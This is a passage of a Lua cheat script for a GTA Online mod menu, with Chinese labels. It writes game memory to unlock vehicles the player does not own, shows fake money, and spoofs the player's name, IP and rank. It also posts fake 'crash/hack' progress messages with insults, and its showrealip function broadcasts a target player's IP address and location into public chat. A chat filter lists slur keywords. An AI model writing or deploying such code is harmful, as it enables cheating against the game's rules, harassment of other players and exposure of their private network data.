        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
        wait(1000)
        for i = 0, 20 do
            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
        end
        wait(1000)
        menu.trigger_commands("tplsia")
    end
end
------------------------------------
-----------线上模式服务-------------
------------------------------------
function bitTest(addr, offset)
    return (memory.read_int(addr) & (1 << offset)) ~= 0
end
local function CanSpawnNanoDrone()
    return BitTest(read_global.int(1962996), 23)
end
local function CanUseDrone()
    if not is_player_active(players.user(), true, true) then
        return false
    end
    if util.is_session_transition_active() then
        return false
    end
    if players.is_in_interior(players.user()) then
        return false
    end
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        return false
    end
    if PED.IS_PED_IN_ANY_TRAIN(players.user_ped()) or PLAYER.IS_PLAYER_RIDING_TRAIN(players.user()) then
        return false
    end
    if PED.IS_PED_FALLING(players.user_ped()) then
        return false
    end
    if ENTITY.GET_ENTITY_SUBMERGED_LEVEL(players.user_ped()) > 0.3 then
        return false
    end
    if ENTITY.IS_ENTITY_IN_AIR(players.user_ped()) then
        return false
    end
    if PED.IS_PED_ON_VEHICLE(players.user_ped()) then
        return false
    end
    return true
end
-- 即时纳米无人机
function nanodrone()
    local p_bits = memory.script_global(1962996)
    local bits = memory.read_int(p_bits)
    if CanUseDrone() and not BitTest(bits, 24) then
        TASK.CLEAR_PED_TASKS(players.user_ped())
        memory.write_int(p_bits, SetBit(bits, 24))
        if not CanSpawnNanoDrone() then
            memory.write_int(p_bits, SetBit(bits, 23))
        end
    end
end
-- 请求豪华直升机
function luxuryhelicopter()
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and not NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_heli_taxi", -1, true, 0) then
        write_global.int(2793044 + 888, 1)
        write_global.int(2793044 + 895, 1)
    end
end
function DoesPlayerOwnBandito(player)
    if player ~= -1 then
        local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 299)
        return BitTest(memory.read_int(address), 4)
    end
    return false
end
-- 即时RC匪徒
function bandito()
    write_global.int(2793044 + 6874, 1)
    if not DoesPlayerOwnBandito(players.user()) then
        local address = memory.script_global(1853910 + (players.user() * 862 + 1) + 267 + 299)
        memory.write_int(address, SetBit(memory.read_int(address), 4))
    end
end
function DoesPlayerOwnMinitank(player)
    if player ~= -1 then
        local address = memory.script_global(1853910 + (player * 862 + 1) + 267 + 428 + 2)
        return BitTest(memory.read_int(address), 15)
    end
    return false
end
-- 即时遥控RC坦克
function rctank()
    write_global.int(2793044 + 6875, 1)
    if not DoesPlayerOwnMinitank(players.user()) then
        local address = memory.script_global(1853910 + (players.user() * 862 + 1) + 267 + 428 + 2)
        memory.write_int(address, SetBit(memory.read_int(address), 15))
    end
end
------------------------------------
-----------线上模式传送-------------
------------------------------------
local SEC = ENTITY.SET_ENTITY_COORDS
local set = {alert = true}
local ownedprops = {
    {'事务所', 826},
    {'游戏厅', 740},
    {'改车铺', 779},
    {'地堡', 557},
    {'货物仓库', 473},
    {'CEO办公室',   475 },
    {'设施', 590},
    {'机库', 569},
    {'摩托帮会所', 492,
    mcprops = {'摩托帮产业', loc = {
        {'可卡因制造厂', 497 },
        {'假钞伪造厂。', 500 },
        {'证件伪造厂', 498 },
        {'冰毒实验室', 499 },
        {'大麻农场', 496 },
    }}},
    {'夜总会', 614},
    {'车辆仓库', 524}
}
local function getblip(id)
    local blip = HUD.GET_FIRST_BLIP_INFO_ID(id)
    while blip ~= 0 do
        local blipColour = HUD.GET_BLIP_COLOUR(blip)
        if HUD.DOES_BLIP_EXIST(blip) and blipColour != 55 and blipColour != 3 then return blip end
        blip = HUD.GET_NEXT_BLIP_INFO_ID(id)
    end
end
local function tpToBlip_teleport(blip)
    local pos = HUD.GET_BLIP_COORDS(blip)
    SEC(players.user_ped(), pos.x, pos.y, pos.z, false, false, false, false)
end
local properties = {}
local function regenerateTpLocations(root)
    for k, _ in pairs(properties) do
        menu.delete(properties[k])
        properties[k] = nil
    end
    for i = 1, #ownedprops do
        local propblip = getblip(ownedprops[i][2])
        if propblip == nil then break end
        properties[ownedprops[i][1]] = menu.action(root, ownedprops[i][1], {}, '', function()
            if not HUD.DOES_BLIP_EXIST(propblip) then
                gtoast('未找到资产')
                return
            end
            tpToBlip_teleport(propblip)
        end)
        if ownedprops[i].mcprops then
            local mcprops = ownedprops[i].mcprops
            local listName = mcprops[1]
            properties[listName] = menu.list(root, listName, {}, '')
            for j = 1, #mcprops.loc do players.user_ped()
                local mcproploc = getblip(mcprops.loc[j][2])
                if propblip == nil then break end
                menu.action(properties[listName], mcprops.loc[j][1], {}, '', function() 
                    if not HUD.DOES_BLIP_EXIST(propblip) then
                        gtoast('未找到资产')
                        return
                    end
                    tpToBlip_teleport(mcproploc)
                end)
            end
        end
    end
end
function tp_prop()
    regenerateTpLocations(Proptp)
end
function tp_aven()
    SEC(players.user_ped(), 514.31335, 4750.5264, -68.99592, false, false, false, false)
end
function tp_kosa()
    local kos = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(760))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(760))
    if kos.x ==0 and kos.y ==0 and kos.z ==0 then
        if set.alert then
            gtoast('未找到虎鲸') 
        end
    else    
        SEC(players.user_ped(), 1561.1543, 385.98312, -49.68535, false, false, false, false)
    end
end
function tp_moc()
    SEC(players.user_ped(), 1103.3782, -3011.6018, -38.999435, false, false, false, false)
end
function tp_terro()
    local ter = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(632))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(632))
    if ter.x == 0 and ter.y == 0 and ter.z == 0 then
        if set.alert then
            gtoast('未找到恐霸')
        end
    else    
        SEC(players.user_ped(), -1421.2347, -3012.9988, -79.04994, false, false, false, false)
    end
end
function tp_scargo()
    local cPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(478))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(478))
        if cPickup.x == 0 and cPickup.y == 0 and cPickup.z == 0 then
            if set.alert then
                gtoast('未找到特殊货物')  
            end
        else
            SEC(players.user_ped(), cPickup.x, cPickup.y, cPickup.z, false, false, false, false)
        end
    end
function tp_vcargo()
    local vPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(523))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(523))
        if vPickup.x == 0 and vPickup.y == 0 and vPickup.z == 0 then
            if set.alert then
                gtoast('未找到载具货物')
            end
        else
            SEC(players.user_ped(), vPickup.x, vPickup.y, vPickup.z, false, false, false, false)
        end
    end
function tp_desk()
    local pcD = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(521))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(521))
        if pcD.x ~= 0 and pcD.y ~= 0 and pcD.z ~= 0 then
            SEC(players.user_ped(), pcD.x- 1.0, pcD.y + 1.0 , pcD.z, false, false, false, false)
        else
        if set.alert then
            gtoast('未找到电脑')  
        end
    end
end
function tp_NCperson()
    local nigh1 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(143))
    local nigh2 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(480))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(143))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(480))
        if nigh1.x ~= 0 and nigh1.y ~= 0 and nigh1.z ~= 0 then
            SEC(players.user_ped(), nigh1.x, nigh1.y, nigh1.z, false, false, false, false)
        elseif nigh2.x ~= 0 and nigh2.y ~= 0 and nigh2.z ~= 0 then
            SEC(players.user_ped(), nigh2.x, nigh2.y, nigh2.z, false, false, false, false)
        else 
            if set.alert then
            gtoast('找不到目标')
            end
        end
    end
function tp_safe()
    local saf1 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(108))
        local saf2 = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(207))
        HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(108))
        HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(207))
            if saf1.x ~= 0 and saf1.y ~= 0 and saf1.z ~= 0 then
                SEC(players.user_ped(), saf1.x - 1.0, saf1.y + 1.0 , saf1.z, false, false, false, false)
            elseif saf2.x ~= 0 and saf2.y ~= 0 and saf2.z ~= 0 then
                SEC(players.user_ped(), saf2.x, saf2.y + 1.0 , saf2.z, false, false, false, false)
            else
                if set.alert then
                    gtoast('找不到保险柜')  
                end
            end
        end
function tp_mcproduct()
    local pPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(501))
    local hPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(64))
    local bPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(427))
    local plPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(501))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(64))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(427))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
        if pPickup.x == 0 and pPickup.y == 0 and pPickup.z == 0 then
        elseif pPickup.x ~= 0 and pPickup.y ~= 0 and pPickup.z ~= 0 then
            SEC(players.user_ped(), pPickup.x - 1.5, pPickup.y , pPickup.z, false, false, false, false)
            if set.alert then
                gtoast('传送到摩托帮货物')   
            end
        end
        if hPickup.x == 0 and hPickup.y == 0 and hPickup.z == 0 then
        elseif hPickup.x ~= 0 and hPickup.y ~= 0 and hPickup.z ~= 0 then
            SEC(players.user_ped(), hPickup.x- 1.5, hPickup.y, hPickup.z, false, false, false, false)
            if set.alert then
                gtoast('传送到直升机')
            end
        end
        if bPickup.x == 0 and bPickup.y == 0 and bPickup.z == 0 then
        elseif bPickup.x ~= 0 and bPickup.y ~= 0 and bPickup.z ~= 0 then
            SEC(players.user_ped(), bPickup.x, bPickup.y, bPickup.z + 1.0 , false, false, false, false)
            if set.alert then
                gtoast('传送到船')
            end
        end
        if plPickup.x == 0 and plPickup.y == 0 and plPickup.z == 0 then
        elseif plPickup.x ~= 0 and plPickup.y ~= 0 and plPickup.z ~= 0 then
            SEC(players.user_ped(), plPickup.x, plPickup.y + 1.5, plPickup.z - 1, false, false, false, false)
            if set.alert then
                gtoast('传送到飞机')
            end
        else                 
        if set.alert then
            gtoast('未找到摩托帮货物')
        end
    end
end
function tp_bsupplies()
    local sPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(556))
    local dPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(561))
    local fPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(477))
    local plPickup = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(556))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(561))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(477))
                    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(423))
        if sPickup.x == 0 and sPickup.y == 0 and sPickup.z == 0 then
        elseif sPickup.x ~= 0 and sPickup.y ~= 0 and sPickup.z ~= 0 then
            SEC(players.user_ped(), sPickup.x, sPickup.y + 2.0, sPickup.z - 1.0, false, false, false, false)
            if set.alert then
                gtoast('传送到补给品')
            end
        end
        if dPickup.x == 0 and dPickup.y == 0 and dPickup.z == 0 then
        elseif dPickup.x ~= 0 and dPickup.y ~= 0 and dPickup.z ~= 0 then
            SEC(players.user_ped(), dPickup.x, dPickup.y, dPickup.z, false, false, false, false)
            if set.alert then
                gtoast('传送到沙丘FAV')
            end
        end
        if fPickup.x == 0 and fPickup.y == 0 and fPickup.z == 0 then
        elseif fPickup.x ~= 0 and fPickup.y ~= 0 and fPickup.z ~= 0 then
            SEC(players.user_ped(), fPickup.x, fPickup.y, fPickup.z + 1.0 , false, false, false, false)
            if set.alert then
                gtoast('传送到平板拖车')
            end
        else
             if set.alert then
                gtoast('未找到地堡补给品')
             end
        end
    end
function tp_payphone()
    local payPhon = HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(817))
    HUD.GET_BLIP_COORDS(HUD.GET_NEXT_BLIP_INFO_ID(817))
        if payPhon.x == 0 and payPhon.y == 0 and payPhon.z == 0 then
            if set.alert then
                gtoast('未找到公共电话亭')
            end
            else
                SEC(players.user_ped(), payPhon.x, payPhon.y, payPhon.z + 1, false, false, false, false)
        end
    end
function tp_eed()
    if HUD.DOES_BLIP_EXIST(HUD.GET_CLOSEST_BLIP_INFO_ID(780)) then
        local eDock = HUD.GET_BLIP_COORDS(HUD.GET_CLOSEST_BLIP_INFO_ID(780))
        if  eDock.x == 0 and eDock.y == 0 and eDock.z == 0
        then
         if set.alert then
         gtoast('未找到出口码头')
        end
         elseif eDock.x ~= 0 and eDock.y ~= 0 and eDock.z ~= 0 then
             PED.SET_PED_COORDS_KEEP_VEHICLE(players.user_ped(), 1169.5736, -2971.932, 5.9021106)
         end
     end
end
------------------------------------
-----------线上模式宣布-------------
------------------------------------
function get_best_mug_target()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_wallet = players.get_wallet(p)
        if cur_wallet > most then
            most = cur_wallet
            mostp = p
        end
    end
    if cur_wallet == nil then
        gtoast("你孤单一人。找不到最佳抢劫目标")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 钱包里的钱最多($" .. most .. ")。 也许去抢劫他们"
    else
        gtoast("找不到最佳抢劫目标")
        return nil
    end
end
function get_poorest_player()
    local least = 10000000000000000
    local leastp = 0
    for k,p in pairs(players.list(true, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets < least then
            least = cur_assets
            leastp = p
        end
    end
    if cur_assets == nil then
        gtoast("你孤单一人。找不到最穷的玩家。")
        return
    end
    if least ~= 10000000000000000 then
        return PLAYER.GET_PLAYER_NAME(leastp) .. " 是本战局中最穷的玩家!(有$" .. players.get_wallet(leastp) .. " 在他们的钱包里$" .. players.get_bank(leastp) .. " 在银行里!)"
    else
        gtoast("找不到最穷的玩家。")
        return nil
    end
end
function get_richest_player()
    local most = 0
    local mostp = 0
    for k,p in pairs(players.list(false, true, true)) do
        cur_assets = players.get_wallet(p) + players.get_bank(p)
        if cur_assets > most then
            most = cur_assets
            mostp = p
        end
    end
    if cur_assets == nil then
        gtoast("你孤单一人。找不到最富的玩家。")
        return
    end
    if most ~= 0 then
        return PLAYER.GET_PLAYER_NAME(mostp) .. " 是本战局中最富的玩家!(有$" .. players.get_wallet(mostp) .. " 在他们的钱包里$" .. players.get_bank(mostp) .. " 在银行里!)"
    else
        gtoast("找不到最富的玩家。")
        return nil
    end
end
function get_lapdances_amount(pid) 
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 55))
end
function get_prostitutes_solicited(pid)
    return memory.read_int(memory.script_global(1853348 + 1 + (pid * 834) + 205 + 54))
end
function get_horniest_player()
    local highest_horniness = 0
    local horniest = 0
    local most_lapdances = 0
    local most_prostitutes = 0
    for k,p in pairs(players.list(true, true, true)) do
        lapdances = get_lapdances_amount(p)
        prostitutes = get_prostitutes_solicited(p)
        horniness = lapdances + prostitutes
        if horniness > highest_horniness then
            highest_horniness = horniness
            horniest = p
            most_lapdances = lapdances
            most_prostitutes = prostitutes
        end
    end
    if horniness == nil then
        gtoast("你孤单一人。找不到最性奋的玩家。")
        return
    end
    if highest_horniness ~= 0 then
        return PLAYER.GET_PLAYER_NAME(horniest) .. " 是战局中最性奋的玩家!他们的角色招来了 " .. most_prostitutes .. " 妓女,并为 " .. most_lapdances .. " 次脱衣舞付钱!"
    else
        gtoast("找不到最性奋的玩家。")
        return nil
    end
end
end_racism = false
end_homophobia = false
function toxicshit(packet_sender, message_sender, text, team_chat)
    text = string.lower(text)
    local name = players.get_name(message_sender)
    if end_racism and (string.contains(text, "nigg") or string.contains(text, "jew")) then 
        menu.trigger_commands("kick " .. name)
        gtoast(name .. " 说了脏话，自动踢了出去")
    end
    if end_homophobia and (string.contains(text, "fag") or string.contains(text, "tranny")) then 
        menu.trigger_commands("kick " .. name)
        gtoast(name .. " 是同性恋，自动踢了出去")
    end
end
------------------------------------
-----------零食护甲编辑-------------
------------------------------------
function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end
function MP_Index()
    local MP_IPTR = memory.alloc(2)
    STATS.STAT_GET_INT(util.joaat("MPPLY_LAST_MP_CHAR"), MP_IPTR, -1)
    return memory.read_int(MP_IPTR)
end
function STAT_SET_INT(Hash, Value)
    if MP_Index() == 0 then 
        STATS.STAT_SET_INT(util.joaat("MP0_"..Hash), Value, true)
    else
        STATS.STAT_SET_INT(util.joaat("MP1_"..Hash), Value, true)
    end
end
------------------------------------
--------线上模式玩乐-----------------
------------------------------------
function Specon(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' on')
    wait(3000)
end
function Specoff(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' off')
end
------------------------------------
--------线上模式聊天预设-------------
------------------------------------
local function fake_chat_with_percentage_and_target(action)
    chat.send_message(action .. " ${name}. [||||            ] (25%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||        ] (50%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||    ] (75%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||||| ] (89%)", false, true, true)
    wait(math.random(3000, 5000))
end
local function get_random_joke()
    local joke = 'WIP'
    local in_progress = true
    async_http.init('icanhazdadjoke.com', '', function(data)
        joke = data
    end, function()
        joke = 'FAIL'
    end)
    async_http.add_header('Accept', 'text/plain')
    async_http.dispatch()
    while joke == "WIP" do 
        wait()
    end
    return joke
end
chat_presets = {
    ["掉钱袋是没用的"] = "我可以给你钱,但你花在上面的时间得到的钱是没有用的。你最好买一份自己的菜单,然后使用其中的恢复选项。",
    ["GT天下第一!"] = "GrandTouring天下第一!",
    ["GT最帅!"] = "GrandTouring最帅!",
    ["L + Ratio..."] = "L + ratio + u fell off + ur british + who asked + no u + deez nutz + radio + don't care + caught in 4k + cope + seethe + gg + grow the fuck up + silver elite + ligma + taco bell dorito crunch + think outside the bun bitch",
    ["您购买了2take1 "] = "前途无限"
}
function showrealip()
    chat.send_message("${name}: ${ip} | ${geoip.city}, ${geoip.region}, ${geoip.country}", false, true, true)
end
function chatcrash()
    fake_chat_with_percentage_and_target("崩溃")
    chat.send_message("崩溃失败" .. " ${name}. " .. "原因：用你妈免费stand", false, true, true)
end
function ramdomjokelol()
    local joke = get_random_joke()
    if joke ~= "FAIL" then
        chat.send_message(joke, false, true, true)
    end
end
function fakechathacking()
    fake_chat_with_percentage_and_target("黑入")
    chat.send_message("黑入失败" .. " ${name}. " .. "原因：用你妈免费stand", false, true, true)
end
function loopchatjoke()
    if util.is_session_started() then
        local joke = get_random_joke()
        if joke ~= "FAIL" then
            chat.send_message(joke, false, true, true)
        end
        wait(5000)
    end
end
------------------------------------
--------线上随机虚假器-------------
------------------------------------
local alphabet = "abcdefghijklmnopqrstuvwxyzABCEDFGHIJKLMNOPQRSTUVWXYZ0123456789"
local function random_string(length)
    local res = {}
    for i=1, length do 
        res[i] = alphabet[math.random(#alphabet)]
    end
    return table.concat(res)
end
local function random_ip_address()
    local ip = {}
    for i=1, 4 do 
            ip[i] = tostring(math.random(1, 255)) 
    end
    return table.concat(ip, '.')
end
local random_name_spoof = false
function ramdomfakename(on)
    random_name_spoof = on
    if on then 
        menu.trigger_commands("spoofedname " .. random_string(16))
    end
end
local random_ip_spoof = false
function ramdomfakeip(on)
    random_ip_spoof = on
    if on then 
        menu.trigger_commands("spoofedip " .. random_ip_address())
    end
end
local random_rank_spoof = false
function ramdomfakelvl(on)
    random_rank_spoof = on
    if on then 
        menu.trigger_commands("spoofedrank " .. math.random(10000))
    end
end
function spamtextname(on)
    menu.trigger_commands("spamtext " .. random_string(254))
    wait(100)
end
util.on_transition_finished(function()
    if random_name_spoof then
        menu.trigger_commands("spoofedname " .. random_string(16))
    end
    if random_ip_spoof then
        menu.trigger_commands("spoofedip " .. random_ip_address())
    end
    if random_rank_spoof then
        menu.trigger_commands("spoofedrank " .. math.random(10000))
    end
end)
------------------------------------
---------线上假钱-------------------
------------------------------------
local New = {}
function New.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end
function New.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = New.colour( 255, 255, 255 )}
end
cashFakeMoney = 0
bankFakeMoney = 0
fakeMoneyLoopDelay = New.delay(250, 0, 0)
fakeMoneyTransactionPending = true
function generateDelaySettings(root, name, delayTable)
    menu.slider(root, '毫秒', {'JS'..name..'DelayMs'}, '延迟是毫秒、秒和最小值的总和.', 1, 999, delayTable.ms, 1, function(value)
        delayTable.ms = value
    end)
    menu.slider(root, '秒', {'JS'..name..'DelaySec'}, '延迟是毫秒、秒和最小值的总和.', 0, 59, delayTable.s, 1, function(value)
        delayTable.s = value
    end)
    menu.slider(root, '分钟', {'JS'..name..'DelayMin'}, '延迟是毫秒、秒和最小值的总和.', 0, 60, delayTable.min, 1, function(value)
        delayTable.min = value
    end)
end
local function startBusySpinner(message)
    HUD.BEGIN_TEXT_COMMAND_BUSYSPINNER_ON("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(message)
    HUD.END_TEXT_COMMAND_BUSYSPINNER_ON(5)
end
local function transactionPending()
    if not fakeMoneyTransactionPending then return end
    startBusySpinner('交易处理中')
    wait(math.random(1, 1000))
    HUD.BUSYSPINNER_OFF()
end
function addfakemoney()
    HUD._SET_PLAYER_CASH_CHANGE(cashFakeMoney, bankFakeMoney)
    transactionPending()
end
function loopaddfakemoney()
    HUD._SET_PLAYER_CASH_CHANGE(cashFakeMoney, bankFakeMoney)
    transactionPending()
    wait(getTotalDelay(fakeMoneyLoopDelay))
end
------------------------------------
---------保险箱监视器----------------
------------------------------------
local Int_PTR = memory.alloc_int()
local function getMPX()
    return 'MP'.. util.get_char_slot() ..'_'
end
local function STAT_GET_INT(Stat)
    STATS.STAT_GET_INT(util.joaat(getMPX() .. Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end
local function getNightclubDailyEarnings()
    local popularity = math.floor(STAT_GET_INT('CLUB_POPULARITY') / 10)
    if popularity == 100 then return 50000
    elseif popularity >= 90 then return 45000
    elseif popularity >= 80 then return 24000
    elseif popularity >= 70 then return 22000
    elseif popularity >= 60 then return 20000
    elseif popularity >= 50 then return 9500
    elseif popularity >= 40 then return 8500
    elseif popularity >= 30 then return 2500
    elseif popularity >= 20 then return 2000
    elseif popularity >= 10 then return 1600
    else return 1500
    end
end
local function getAgencyDailyEarnings(securityContracts)
    if securityContracts >= 200 then return 20000 end
    return math.floor(securityContracts / 5) * 500
end
JS_tbls = {}
do
    JS_tbls.alphaPoints = {0, 87, 159, 207, 255}
end
JS_tbls.safeManagerToggles = {
    {
        name = '夜总会保险箱',
        command = 'SMclub',
        description = '监视夜总会保险箱的现金,这不会影响收入.',
        toggle = true,
        displayText = function()
            return '夜总会现金' ..': '.. STAT_GET_INT('CLUB_SAFE_CASH_VALUE')  / 1000  ..'k / 210k'
        end
    },
    {
        name = '夜总会人气',
        command = 'SMclubPopularity',
        description = '',
        toggle = false,
        displayText = function()
            return '夜总会人气' ..': '.. math.floor(STAT_GET_INT('CLUB_POPULARITY') / 10)  ..'%'
        end
    },
    {
        name = '夜总会每日收入',
        command = 'SMnightclubEarnings',
        description = '夜总会每日收入.\n每日最高收入为1万.',
        toggle = false,
        displayText = function()
            return '夜总会每日收入' ..': '.. getNightclubDailyEarnings() / 1000  ..'k / day'
        end
    },
    {
        name = '游戏厅保险箱',
        command = 'SMarcade',
        description = '监视游戏厅保险箱的现金,这不会影响收入.\n如果您拥有所有街机游戏,则每日最高收入为5000.',
        toggle = true,
        displayText = function()
            return '游戏厅现金' ..': '.. STAT_GET_INT('ARCADE_SAFE_CASH_VALUE') / 1000  ..'k / 100k'
        end
    },
    {
        name = '事务所保险箱',
        command = 'SMagency',
        description = '监视事务所保险箱的现金,这不会影响收入.\n每日最高收入为2万.',
        toggle = true,
        displayText = function()
            return '事务所现金' ..': '.. STAT_GET_INT("FIXER_SAFE_CASH_VALUE") / 1000  ..'k / 250k'
        end
    },
    {
        name = '安保合约',
        command = 'SMsecurity',
        description = '显示您已完成的事务所安保合约的任务数量.',
        toggle = false,
        displayText = function()
            return '安保合约' ..': '.. STAT_GET_INT('FIXER_COUNT')
        end
    },
    {
        name = '事务所每日收入',
        command = 'SMagencyEarnings',
        description = '事务所每日收入.\n如果您已完成200份合约,则每日最高收入为2万',
        toggle = false,
        displayText = function()
            return '事务所每日收入' ..': '.. getAgencyDailyEarnings(STAT_GET_INT('FIXER_COUNT')) / 1000 ..'k / day'
        end
    },
}
function generateHudSettings(root, prefix, settingsTable)
    menu.slider(root, 'X 位置', {prefix..'XPos'}, '', -200, 0, settingsTable.xOffset, 1, function(value)
        settingsTable.xOffset = value
    end)
    menu.slider(root, 'Y 位置', {prefix..'YPos'}, '', -5, 195, settingsTable.yOffset, 1, function(value)
        settingsTable.yOffset = value
    end)
    menu.slider(root, '比例', {prefix..'scale'}, '文字大小', 200, 1500, 500, 1, function(value)
        settingsTable.scale = value / 1000
    end)
    menu.slider(root, '文本对齐', {prefix..'alignment'}, '1居中,2居左,3居右.', 1, 3, settingsTable.alignment, 1, function(value)
        settingsTable.alignment = value
    end)
    menu.colour(root, '文本颜色', {prefix..'colour'}, '设置文本覆盖的颜色.', settingsTable.textColour, true, function(colour)
        settingsTable.textColour = colour
    end)
end
function generateToggles(table, root, reversed)
    for i = 1, #table do
        if not reversed then
            menu.toggle(root, table[i].name, {table[i].command}, table[i].description, function(toggle)
                table[i].toggle = toggle
            end, table[i].toggle)
        else
            menu.toggle(root, table[i].name, {table[i].command}, table[i].description, function(toggle)
                table[i].toggle = not toggle
            end, not table[i].toggle)
        end
    end
end
------------------------------------
---------赌场-----------------------
------------------------------------
local function STAT_GET_INT_MPPLY(Stat)
    STATS.STAT_GET_INT(util.joaat(Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end
local last_LW_seconds = 0
function casinolucky()
    if STAT_GET_INT_MPPLY('mpply_lucky_wheel_usage') < util.current_unix_time_seconds() then gtoast('幸运转盘目前可用') return end
    local secondsLeft = STAT_GET_INT_MPPLY('mpply_lucky_wheel_usage') - util.current_unix_time_seconds()
    local hours = math.floor(secondsLeft / 3600)
    local minutes = math.floor((secondsLeft / 60) % 60)
    local seconds = secondsLeft % 60
    if last_LW_seconds != seconds then
        gtoast((hours < 10 and ('0'.. hours) or hours) ..':'.. (minutes < 10 and ('0'.. minutes) or minutes) ..':'.. (seconds < 10 and ('0'.. seconds) or seconds))
        last_LW_seconds = seconds
    end
end
function casinolp()
    local chips = STAT_GET_INT_MPPLY('mpply_casino_chips_won_gd')
    if chips > 0 then
        gtoast('您赢了' ..' '.. chips ..' '.. '筹码')
    elseif chips < 0 then
        gtoast('您输了' ..' '.. chips * -1 ..' '.. '筹码')
    else
        gtoast('您还没有赢或输任何筹码.')
    end
end
------------------------------------
-----------时间挑战赛---------------
------------------------------------
local function ttTimeToString(time)
    local min = math.floor(time / 60000)
    local sec = (time % 60000) / 1000
    return (min == 0 and '' or min ..'min ') .. sec ..'s'
end
local function tpToBlip(blip)
local pos = HUD.GET_BLIP_COORDS(blip)
local tpEntity = (PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) and my_cur_car or players.user_ped())
ENTITY.SET_ENTITY_COORDS(tpEntity, pos.x, pos.y, pos.z, false, false, false, false)
end
function besttime()
    gtoast('个人最佳记录' ..': '.. ttTimeToString((STAT_GET_INT_MPPLY('mpply_timetrialbesttime'))))
    wait(100)
end
function tptotime()
    local ttBlip = HUD._GET_CLOSEST_BLIP_OF_TYPE(430)
    if not HUD.DOES_BLIP_EXIST(ttBlip) then
        gtoast('Couldn\'t find time trial.')
        return
    end
    tpToBlip(ttBlip)
end
function bestrctime()
    gtoast('个人最佳记录' ..': '.. ttTimeToString(STAT_GET_INT_MPPLY('mpply_rcttbesttime')))
    wait(100)
end
function tptorctime()
    local ttBlip = HUD._GET_CLOSEST_BLIP_OF_TYPE(673)
    if not HUD.DOES_BLIP_EXIST(ttBlip) then
        gtoast('未能找到RC匪徒时间挑战赛')
        return
    end
    tpToBlip(ttBlip)
end
------------------------------------
-----------阻挡区域-----------------
------------------------------------   
local notifications = true
local blockInProgress = false
function blockAvailable(areaBlocked, areaName)
    if blockInProgress then gtoast('一个阻挡已经在运行') return false end
    if areaBlocked then gtoast(areaName ..' '.. '已被阻挡') return false end
    return true
end
